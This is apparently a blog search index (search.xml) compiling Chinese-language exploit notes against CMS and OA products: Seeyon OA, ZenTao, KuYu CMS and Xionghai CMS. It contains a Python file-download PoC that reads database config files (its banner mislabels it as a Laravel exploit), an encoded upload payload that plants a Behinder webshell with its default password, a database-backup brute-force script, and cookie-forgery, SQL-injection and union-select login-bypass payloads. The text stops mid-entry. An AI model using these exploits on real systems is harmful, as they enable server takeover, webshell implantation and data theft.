<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CNVD-2020-62422)/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CNVD-2020-62422)/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&apos;+------------------------------------------&apos;)</span><br><span class="line">    print(&apos;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&apos;)</span><br><span class="line">    print(&apos;+  \033[34mVersion: Laravel framework &lt;= 5.5.21                              \033[0m&apos;)</span><br><span class="line">    print(&apos;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&apos;)</span><br><span class="line">    print(&apos;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&apos;)</span><br><span class="line">    print(&apos;+------------------------------------------&apos;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/seeyon/webmail.do?method=doDownloadAtt&amp;filename=PeiQi.txt&amp;filePath=../conf/datasourceCtp.properties&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)</span><br><span class="line">        if &quot;workflow&quot; in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标&#123;&#125;存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">            print(&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;.format(response.text))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 文件请求失败 \033[0m&quot;)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>致远OA A8 是一款流行的协同管理软件，在各中、大型企业机构中广泛使用。</p><p>由于致远OA旧版本某些接口能被未授权访问，并且部分函数存在过滤不足，攻击者通过构造恶意请求，权限绕过漏洞，可在无需登录的情况下上传恶意脚本文件，从而控制服务器</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>致远OA V8.0</p><p>致远OA V7.1、V7.1SP1</p><p>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</p><p>致远OA V6.0、V6.1SP1、V6.1SP2</p><p>致远OA V5.x</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一、首先测试漏洞环境是否存在</p><p>POC验证漏洞存在否</p><pre><code>127.0.0.1:8002/seeyon/thirdpartyController.do.css/..;/ajax.do</code></pre><p><img src="图片/075d3dbde2ed3ec990e4b1e342ee8700.png" alt></p><p>利用PAYLOAD</p><pre><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1Host: 127.0.0.1Connection: closeCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9loginPageURL=; login_locale=zh_CN;Content-Type: application/x-www-form-urlencodedmanagerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</code></pre><p>利用成功：</p><p><img src="图片/490c91fe6eb8083e821cc41675117fa9.png" alt><br>利用失败：</p><p><img src="图片/1cfdb4046346668a45062f6f5a3f775a.png" alt></p><p>冰蝎3 默认马pass : rebeyond</p><p>webshell地址: <a href="http://127.0.0.1/seeyon/SeeyouUpdate1.jspx" target="_blank" rel="noopener">http://127.0.0.1/seeyon/SeeyouUpdate1.jspx</a></p><p>内容木马名称都可以自主修改,只是做了gzip数据的压缩然后在进行 url的编码</p><p><strong>推荐工具</strong></p><p><img src="图片/QQ截图20210202142727.png" alt></p><p>链接: <a href="https://pan.baidu.com/s/1tsdcmjj9G_ybFtDvGEEisA" target="_blank" rel="noopener">https://pan.baidu.com/s/1tsdcmjj9G_ybFtDvGEEisA</a>  密码: q1ns</p><p>最好使用低版本java  例如：Java8</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="zentao-getshell-禅道8-2-9-2-1前台Getshell"><a href="#zentao-getshell-禅道8-2-9-2-1前台Getshell" class="headerlink" title="zentao-getshell 禅道8.2 - 9.2.1前台Getshell"></a>zentao-getshell 禅道8.2 - 9.2.1前台Getshell</h1><h2 id="Python-Usage"><a href="#Python-Usage" class="headerlink" title="Python Usage"></a>Python Usage</h2><p>脚本github获取</p><p><code>python exp.py http://127.0.0.1:81/ jas502n.php</code></p><p><img src="禅道8.2 - 9.2.1前台Getshell/zentao.jpg" alt></p><p><img src="禅道8.2 - 9.2.1前台Getshell/zentao.gif" alt></p><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p><a href="https://github.com/jas502n/zentao-getshell" target="_blank" rel="noopener">https://github.com/jas502n/zentao-getshell</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>1.后台可以修改模板文件，在模板文件中调用模板代码可实现文件包含</p><p><img src="文件包含/Zm3a6wItfYr45sx.png" alt><br>2.首先在设置中上传logo处，上传图片马，需要注意不能是用户的头像上传处上传木马，因为头像会进行缩放，导致文件内容被修改<br><img src="文件包含/XkU4DbL6ZfNOVGE.png" alt><br>3.上传成功后会返回路径，图片马内容为&lt;?php phpinfo(); ?&gt;，需要注意php代码必须包含最后的?&gt;，否则会报语法错误<br><img src="文件包含/JUqLGubNYmsD14i.png" alt><br>4.进入模板功能处，在index.html，即主页模板中添加模板代码，同样需要注意，路径不能以/开头，否则会被找不到错误</p><pre><code>{include file=&quot;uploads/config/20200325/033966a7d27975812915522464e252a3.jpg&quot; /}</code></pre><p><img src="文件包含/iDNHBzdJfhsjlFG.png" alt><br>接着打开主页，即可看到phpinfo信息</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7486" target="_blank" rel="noopener">https://xz.aliyun.com/t/7486</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%8B%82%E9%9B%A8CMS/%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>后台可以直接备份数据库，备份后为.sql.gz文件(可以在设置里更改是否压缩)，文件名为time函数生成的时间戳，可直接爆破进行下载，这里先附上exp</p><pre><code># !/usr/bin/python3# -*- coding:utf-8 -*-# author: Forthrgloryimport requestsimport timedef getDatabase(url,username, password):session = requests.session()u = &apos;http://%s/admin/index/login.html&apos; % (url)head = {&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;}data = {&apos;username&apos;: username,&apos;password&apos;: password,&apos;code&apos;: 1}session.post(u, data, headers = head)u = &apos;http://%s/admin/database/export.html&apos; % (url)data = {&apos;layTableCheckbox&apos;:&apos;on&apos;,&apos;tables[0]&apos;:&apos;ky_ad&apos;,&apos;tables[1]&apos;:&apos;ky_addons&apos;,&apos;tables[2]&apos;:&apos;ky_bookshelf&apos;,&apos;tables[3]&apos;:&apos;ky_category&apos;,&apos;tables[4]&apos;:&apos;ky_collect&apos;,&apos;tables[5]&apos;:&apos;ky_comment&apos;,&apos;tables[6]&apos;:&apos;ky_config&apos;,&apos;tables[7]&apos;:&apos;ky_crontab&apos;,&apos;tables[8]&apos;:&apos;ky_link&apos;,&apos;tables[9]&apos;:&apos;ky_member&apos;,&apos;tables[10]&apos;:&apos;ky_menu&apos;,&apos;tables[11]&apos;:&apos;ky_news&apos;,&apos;tables[12]&apos;:&apos;ky_novel&apos;,&apos;tables[13]&apos;:&apos;ky_novel_chapter&apos;,&apos;tables[14]&apos;:&apos;ky_route&apos;,&apos;tables[15]&apos;:&apos;ky_slider&apos;,&apos;tables[16]&apos;:&apos;ky_template&apos;,&apos;tables[17]&apos;:&apos;ky_user&apos;,&apos;tables[18]&apos;:&apos;ky_user_menu&apos;}t = time.strftime(&quot;%Y%m%d-%H%M%S&quot;, time.localtime())session.post(u, data = data)for i in range(0, 19):u2 = &apos;http://%s/admin/database/export.html?id=%s&amp;start=0&apos; % (url, str(i))session.get(u2)t = &apos;http://&apos; + url + &apos;/public/database/&apos; + t + &apos;-1.sql.gz&apos;return tif __name__ == &apos;__main__&apos;:u = &apos;127.0.0.1&apos;username = &apos;admin&apos;password = &apos;admin&apos;t = getDatabase(u, username, password)print(t)</code></pre><p>运行代码，得到路径(默认生成路径为/public/database/，可在设置中修改)<br><img src="后台数据泄露/2Z9dpibMEs1PUcB.png" alt></p><p>直接访问下载<br><img src="后台数据泄露/kxcNeHhSqviyfpR.png" alt></p><p>可以看到所有数据库信息全在了<br><img src="后台数据泄露/p2VETuFUze3lDZS.png" alt></p><p><a href="https://xz.aliyun.com/t/7486" target="_blank" rel="noopener">https://xz.aliyun.com/t/7486</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>漏洞位置：inc/checklogin.php</p><pre><code>&lt;?php$user=$_COOKIE[&apos;user&apos;];if ($user==&quot;&quot;){header(&quot;Location: ?r=login&quot;);exit;   }?&gt;</code></pre><p>该处的代码逻辑存在问题，直接从COOKIE处赋值给$user</p><p>如果 $user为空就跳转至登录界面</p><p>反之如果不为空就可以访问，因此存在越权访问。</p><h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>我们首先从admin中进入使用之前的账号登录后台。然后找到一个发布内容的页面：参数为?r=newwz</p><p><img src="越权/20200417210934-af0398c8-80ac-1.png" alt><br>之后我们退出登录，回到登录界面。查看页面的cookie</p><p><img src="越权/20200417210901-9aef1ccc-80ac-1.png" alt></p><p>发现在cookie里确实没有user值，我们尝试直接跳转刚才登录后的发布页面，发现会自动跳转到登录界面。</p><p>根据代码逻辑，我们可以尝试在cookie中添加一个user，因为代码没有判断user的具体值，所以填入任意数值即可。<br><img src="越权/20200417210825-85b55ac4-80ac-1.png" alt><br>我们在尝试跳转页面<br><img src="越权/20200417210755-739cb364-80ac-1.png" alt><br>发现没有登录，我们也成功进入了后台页面。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B%E4%B8%AD%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>漏洞位置：/install/index.php</p><p>RIPS审计出现sql注入，跟进文件比对审计结果。</p><p><img src="安装流程中存在SQL注入/20200417205753-0d10c2d0-80ab-1.png" alt><br>通读代码发现代码逻辑如下：</p><p>1.检测是否生成了InstallLock.txt文件</p><p>2.执行sql语句</p><p>审计发现这里sql语句确实没有经过过滤，直接插入update的sql语句，导致sql注入。<br><img src="安装流程中存在SQL注入/20200417205844-2b945a14-80ab-1.png" alt></p><p>漏洞演示：<br>payload:</p><pre><code>1&apos; extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code></pre><p>1.根据源码可知，我们首先需要删除安装目录下的installLock.txt文件（如果网站上存在一个任意文件删除漏洞）<br><img src="安装流程中存在SQL注入/20200417210019-6445327a-80ab-1.png" alt></p><p>2.删除后我们重新进入安装界面。<br><img src="安装流程中存在SQL注入/20200417211243-1faa9248-80ad-1.png" alt></p><p>在管理账号一栏输入我们的payload，也就是我们常见的报错注入方法，</p><p>之后我们提交：</p><p><img src="安装流程中存在SQL注入/20200417205920-4105b410-80ab-1.png" alt></p><p>发现在修改错误一栏发现爆出我们的Mysql版本，证明漏洞存在。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>漏洞位置：files/content.php</p><pre><code>&lt;div class=&quot;manageinfo&quot;&gt;&lt;ul&gt;&lt;div class=&quot;lou&quot;&gt;回复 #&lt;?php echo $pinglun[&apos;id&apos;]?&gt; 楼&lt;/div&gt;&lt;?php $query2 = &quot;SELECT * FROM manage&quot;;$resul2 = mysql_query($query2) or die(&apos;SQL语句有误：&apos;.mysql_error());$manage2 = mysql_fetch_array($resul2);if ($manage2[&apos;img&apos;]==&quot;&quot;){$touxiang=&quot;images/manage.jpg&quot;;} else{$touxiang=$manage2[&apos;img&apos;];  }?&gt;&lt;img src=&quot;&lt;?php echo $touxiang?&gt;&quot;&gt;&lt;strong&gt;&lt;?php echo $manage2[&apos;name&apos;]?&gt;&lt;span&gt;认证站长&lt;/span&gt;&lt;/strong&gt;&lt;li&gt;位置：&lt;a&gt;&lt;?php echo $pinglun[&apos;rip&apos;]?&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;时间：&lt;a&gt;&lt;?php echo tranTime(strtotime($pinglun[&apos;rdate&apos;]))?&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;来自：&lt;a&gt;&lt;?php echo $pinglun[&apos;rshebei&apos;]?&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</code></pre><p>这里是从$pinglun这个变量中取出其中的信息，随后插入存储信息的interaction表</p><p>在/files/submit.php中将content内容给过滤。</p><pre><code>$content=addslashes(strip_tags($content));  //过滤HTML</code></pre><p>在评论处可以提交昵称、邮箱、网址、评论内容，但是显示评论和留言的地方有昵称，所以只有昵称处有存储型XSS。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%90%8E%E5%8F%B0%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p>漏洞位置：admin/files/login.php</p><pre><code>&lt;?php ob_start();require &apos;../inc/conn.php&apos;;$login=$_POST[&apos;login&apos;];$user=$_POST[&apos;user&apos;];$password=$_POST[&apos;password&apos;];$checkbox=$_POST[&apos;checkbox&apos;];if ($login&lt;&gt;&quot;&quot;){$query = &quot;SELECT * FROM manage WHERE user=&apos;$user&apos;&quot;;$result = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());$users = mysql_fetch_array($result);if (!mysql_num_rows($result)) {  echo &quot;&lt;Script language=JavaScript&gt;alert(&apos;抱歉，用户名或者密码错误。&apos;);history.back();&lt;/Script&gt;&quot;;exit;}else{$passwords=$users[&apos;password&apos;];if(md5($password)&lt;&gt;$passwords){echo &quot;&lt;Script language=JavaScript&gt;alert(&apos;抱歉，用户名或者密码错误。&apos;);history.back();&lt;/Script&gt;&quot;;exit;   }//写入登录信息并记住30天if ($checkbox==1){setcookie(&apos;user&apos;,$user,time()+3600*24*30,&apos;/&apos;);}else{setcookie(&apos;user&apos;,$user,0,&apos;/&apos;);}echo &quot;&lt;script&gt;this.location=&apos;?r=index&apos;&lt;/script&gt;&quot;;exit;}exit;ob_end_flush();}?&gt;</code></pre><p>万能密码登录有两个点：</p><p>1.user未经过过滤直接拼接进入数据库查询</p><p>2.password的md5对比可绕过</p><p>payload:</p><pre><code>user:1&apos; union select 1,2,&apos;test&apos;,&apos;c4ca4238a0b923820dcc509a6f75849b&apos;,5,6,7,8#password:1此处md5(1)=c4ca4238a0b923820dcc509a6f75849b</code></pre><p>我们进入后台，在账号一栏中填入payload，密码输入mad5加密的1即可成功登录。</p><p><img src="后台万能密码登录/20200417210643-48d1ff22-80ac-1.png" alt><br><img src="后台万能密码登录/20200417210717-5cf79732-80ac-1.png" alt></p><p>漏洞分析</p><p>我们登录我们的mysql数据库，查询xhcms库下的manage表<br><img src="后台万能密码登录/20200417210537-2174ba32-80ac-1.png" alt><br>我们使用联合查询的方法，发现结果在数据库下添加一行新的参数，而添加的值我们是可控的。</p><p>所以我们的payload就是通过传入新的md5加密后的password，从而达到绕过验证，直接登录的目的。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
